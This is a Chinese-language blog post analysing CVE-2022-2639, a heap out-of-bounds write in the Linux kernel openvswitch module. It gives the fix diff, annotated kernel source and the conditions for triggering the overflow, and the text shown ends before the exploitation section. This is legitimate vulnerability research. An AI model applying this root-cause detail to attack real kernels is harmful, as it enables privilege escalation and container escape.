<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="简介在Linux kernel 的 openvswitch 模块中存在一处由整数溢出导致的堆越界写。成功利用这个漏洞会导致Linux kernel本地提权或是容器逃逸。 漏洞分析漏洞分析基于Linux kernel 5.13。源码下载： 1git clone git:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;ubuntu&#x2F;ubuntu-focal.git -b Ubuntu-hwe-5.13-5.1">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-2639  openvswitch LPE  漏洞分析">
<meta property="og:url" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="veritas501&#39;s blog">
<meta property="og:description" content="简介在Linux kernel 的 openvswitch 模块中存在一处由整数溢出导致的堆越界写。成功利用这个漏洞会导致Linux kernel本地提权或是容器逃逸。 漏洞分析漏洞分析基于Linux kernel 5.13。源码下载： 1git clone git:&#x2F;&#x2F;kernel.ubuntu.com&#x2F;ubuntu&#x2F;ubuntu-focal.git -b Ubuntu-hwe-5.13-5.1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512224846125.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512225001216.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512231843872.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232254083.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232743116.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512233523494.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220315143558030.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512234254555.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235032056.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512232743116.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235627866.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512235925974.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513000504671.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513000640216.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513001425838.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513001728302.png">
<meta property="og:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220513002512092.png">
<meta property="article:published_time" content="2022-10-17T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-08T03:09:28.454Z">
<meta property="article:author" content="veritas501">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220512224846125.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2022-2639  openvswitch LPE  漏洞分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-2639  openvswitch LPE  漏洞分析&body=Check out this article: https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=CVE-2022-2639  openvswitch LPE  漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=CVE-2022-2639  openvswitch LPE  漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-a-BUG"><span class="toc-number">2.1.</span> <span class="toc-text">Just a BUG ??</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-a-vulnerability"><span class="toc-number">2.2.</span> <span class="toc-text">It’s a vulnerability !!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        CVE-2022-2639  openvswitch LPE  漏洞分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">veritas501</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-10-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2022-10-18</time>
        
        (Updated: <time datetime="2023-12-08T03:09:28.454Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在Linux kernel 的 openvswitch 模块中存在一处由整数溢出导致的堆越界写。成功利用这个漏洞会导致Linux kernel本地提权或是容器逃逸。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞分析基于Linux kernel 5.13。源码下载：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://kernel.ubuntu.com/ubuntu/ubuntu-focal.git -b Ubuntu-hwe-5.13-5.13.0-35.40_20.04.1 --depth 1</span><br></pre></td></tr></table></figure>



<p>漏洞本身并不复杂，可以直接看patch：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/openvswitch/flow_netlink.c b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">index 7176156d38443c..4c09cf8a0ab2dc 100644</span></span><br><span class="line"><span class="comment">--- a/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">+++ b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="meta">@@ -2465,7 +2465,7 @@</span> static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,</span><br><span class="line"> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);</span><br><span class="line"> </span><br><span class="line"> 	if (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="deletion">-		if ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span></span><br><span class="line"><span class="addition">+		if ((next_offset + req_size) &gt; MAX_ACTIONS_BUFSIZE) &#123;</span></span><br><span class="line"> 			OVS_NLERR(log, &quot;Flow action size exceeds max %u&quot;,</span><br><span class="line"> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"> 			return ERR_PTR(-EMSGSIZE);</span><br></pre></td></tr></table></figure>



<p>注意到不等式左边的<code>next_offset</code>为有符号，而右边的<code>req_size</code>为无符号。在两端比大小之前，左边相减的结果可能为负数，随即被cast成无符号与右边比较。如果是负数就会变成很大的正数，从而使check失效。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:2338</span></span><br><span class="line"><span class="comment">/* 2338 */</span> <span class="type">static</span> <span class="keyword">struct</span> nlattr *<span class="title function_">reserve_sfa_size</span><span class="params">(<span class="keyword">struct</span> sw_flow_actions **sfa,</span></span><br><span class="line"><span class="params"><span class="comment">/* 2339 */</span> 				       <span class="type">int</span> attr_len, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line"><span class="comment">/* 2340 */</span> &#123;</span><br><span class="line"><span class="comment">/* 2341 */</span> </span><br><span class="line"><span class="comment">/* 2342 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">acts</span>;</span></span><br><span class="line"><span class="comment">/* 2343 */</span> 	<span class="type">int</span> new_acts_size;</span><br><span class="line"><span class="comment">/* 2344 */</span> 	<span class="type">size_t</span> req_size = NLA_ALIGN(attr_len);</span><br><span class="line"><span class="comment">/* 2345 */</span> 	<span class="type">int</span> next_offset = offsetof(<span class="keyword">struct</span> sw_flow_actions, actions) +</span><br><span class="line"><span class="comment">/* 2346 */</span> 					(*sfa)-&gt;actions_len;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2351 */</span> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * <span class="number">2</span>);</span><br><span class="line"><span class="comment">/* 2352 */</span> </span><br><span class="line"><span class="comment">/* 2353 */</span> 	<span class="keyword">if</span> (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="comment">/* 2354 */</span> 		<span class="keyword">if</span> ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span><br><span class="line"><span class="comment">/* 2355 */</span> 			OVS_NLERR(<span class="built_in">log</span>, <span class="string">&quot;Flow action size exceeds max %u&quot;</span>,</span><br><span class="line"><span class="comment">/* 2356 */</span> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"><span class="comment">/* 2357 */</span> 			<span class="keyword">return</span> ERR_PTR(-EMSGSIZE);</span><br><span class="line"><span class="comment">/* 2358 */</span> 		&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>MAX_ACTIONS_BUFSIZE</code>的大小为0x8000，即如果能够让<code>next_offset</code>大于0x8000就能绕过判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:2275</span></span><br><span class="line"><span class="comment">/* 2275 */</span> <span class="meta">#<span class="keyword">define</span> MAX_ACTIONS_BUFSIZE	(32 * 1024)</span></span><br></pre></td></tr></table></figure>

<p>绕过判断就会顺势执行到2359行，<code>new_acts_size</code>被赋值为0x8000，之后在2362行分配新buffer，并在2366行将内容拷贝到新申请的buffer中。并最终返回buffer+next_offset的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:2353</span></span><br><span class="line"><span class="comment">/* 2353 */</span> 	<span class="keyword">if</span> (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="comment">/* 2354 */</span> 		<span class="keyword">if</span> ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2358 */</span> 		&#125;</span><br><span class="line"><span class="comment">/* 2359 */</span> 		new_acts_size = MAX_ACTIONS_BUFSIZE;</span><br><span class="line"><span class="comment">/* 2360 */</span> 	&#125;</span><br><span class="line"><span class="comment">/* 2361 */</span> </span><br><span class="line"><span class="comment">/* 2362 */</span> 	acts = nla_alloc_flow_actions(new_acts_size);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 2366 */</span> 	<span class="built_in">memcpy</span>(acts-&gt;actions, (*sfa)-&gt;actions, (*sfa)-&gt;actions_len);</span><br><span class="line"><span class="comment">/* 2367 */</span> 	acts-&gt;actions_len = (*sfa)-&gt;actions_len;</span><br><span class="line"><span class="comment">/* 2368 */</span> 	acts-&gt;orig_len = (*sfa)-&gt;orig_len;</span><br><span class="line"><span class="comment">/* 2369 */</span> 	kfree(*sfa);</span><br><span class="line"><span class="comment">/* 2370 */</span> 	*sfa = acts;</span><br><span class="line"><span class="comment">/* 2371 */</span> </span><br><span class="line"><span class="comment">/* 2372 */</span> out:</span><br><span class="line"><span class="comment">/* 2373 */</span> 	(*sfa)-&gt;actions_len += req_size;</span><br><span class="line"><span class="comment">/* 2374 */</span> 	<span class="keyword">return</span>  (<span class="keyword">struct</span> nlattr *) ((<span class="type">unsigned</span> <span class="type">char</span> *)(*sfa) + next_offset);</span><br><span class="line"><span class="comment">/* 2375 */</span> &#125;</span><br></pre></td></tr></table></figure>

<p>来到调用<code>reserve_sfa_size()</code>的外层，3027行的to已经带上了前面的offset，并最后在3031行的memcpy处发生堆越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:3021</span></span><br><span class="line"><span class="comment">/* 3021 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">copy_action</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *from,</span></span><br><span class="line"><span class="params"><span class="comment">/* 3022 */</span> 		       <span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line"><span class="comment">/* 3023 */</span> &#123;</span><br><span class="line"><span class="comment">/* 3024 */</span> 	<span class="type">int</span> totlen = NLA_ALIGN(from-&gt;nla_len);</span><br><span class="line"><span class="comment">/* 3025 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">to</span>;</span></span><br><span class="line"><span class="comment">/* 3026 */</span> </span><br><span class="line"><span class="comment">/* 3027 */</span> 	to = reserve_sfa_size(sfa, from-&gt;nla_len, <span class="built_in">log</span>);</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// heap buffer oob write</span></span><br><span class="line"><span class="comment">/* 3031 */</span> 	<span class="built_in">memcpy</span>(to, from, totlen);</span><br></pre></td></tr></table></figure>



<h3 id="Just-a-BUG"><a href="#Just-a-BUG" class="headerlink" title="Just a BUG ??"></a>Just a BUG ??</h3><p>搞清楚了这个bug的成因后，便是开始尝试编写POC证明这里的确能够溢出，而不是停留于“理论上”。而这显然没有想象中那么容易。</p>
<p>首先我们需要更多的信息！读更多的源码！</p>
<p>看一下分配之前buffer的函数，其实就是简单的使用kmalloc，包含一个<code>struct sw_flow_actions</code>的header，后面紧跟着buffer。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; linux-5.13/net/openvswitch/flow_netlink.c:2277</span></span><br><span class="line"><span class="comment">/* 2277 */</span> <span class="type">static</span> <span class="keyword">struct</span> sw_flow_actions *<span class="title function_">nla_alloc_flow_actions</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line"><span class="comment">/* 2278 */</span> &#123;</span><br><span class="line"><span class="comment">/* 2279 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">sfa</span>;</span></span><br><span class="line"><span class="comment">/* 2280 */</span> </span><br><span class="line"><span class="comment">/* 2281 */</span> 	WARN_ON_ONCE(size &gt; MAX_ACTIONS_BUFSIZE);</span><br><span class="line"><span class="comment">/* 2282 */</span> </span><br><span class="line"><span class="comment">/* 2283 */</span> 	sfa = kmalloc(<span class="keyword">sizeof</span>(*sfa) + size, GFP_KERNEL);</span><br><span class="line"><span class="comment">/* 2284 */</span> 	<span class="keyword">if</span> (!sfa)</span><br><span class="line"><span class="comment">/* 2285 */</span> 		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"><span class="comment">/* 2286 */</span> </span><br><span class="line"><span class="comment">/* 2287 */</span> 	sfa-&gt;actions_len = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 2288 */</span> 	<span class="keyword">return</span> sfa;</span><br><span class="line"><span class="comment">/* 2289 */</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>sizeof(struct sw_flow_actions)</code>为0x20，再由于对齐，所以并不会分配0x8020的chunk，而是分配了0x10000的chunk（注意这里的0x10000）。</p>
<p>同时我还发现，openvswitch通过netlink进行通信。而这之中用到了名为<code>nlattr</code>的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;</span></span><br><span class="line"><span class="comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span></span><br><span class="line"><span class="comment"> * |        Header       | Pad |     Payload       | Pad |</span></span><br><span class="line"><span class="comment"> * |   (struct nlattr)   | ing |                   | ing |</span></span><br><span class="line"><span class="comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span></span><br><span class="line"><span class="comment"> *  &lt;-------------- nlattr-&gt;nla_len --------------&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">	__u16           nla_len;</span><br><span class="line">	__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意这里所有的字段都是存在padding的，而这个padding值为4bytes。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NLA_ALIGNTO		4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NLA_ALIGN(len)		(((len) + NLA_ALIGNTO - 1) &amp; ~(NLA_ALIGNTO - 1))</span></span><br></pre></td></tr></table></figure>

<p>此外，也是最最重要的，len字段为u16类型，也就是说我们的payload撑死就只有0xFFFF的的大小，而前面在申请buffer时分配了0x10000的chunk，看起来完全没法溢出啊。</p>
<p>有人可能在想，那一个不行，能不能连续用两个？还是不行。</p>
<p>因为前面说到openvswitch模块使用netlink进行通信，所以首先需要遵守netlink通信时的数据结构，也就是<code>struct nlmsghdr</code>这个header。之后，netlink又有很多种类，可以在<code>netlink.h</code>中找到定义：</p>
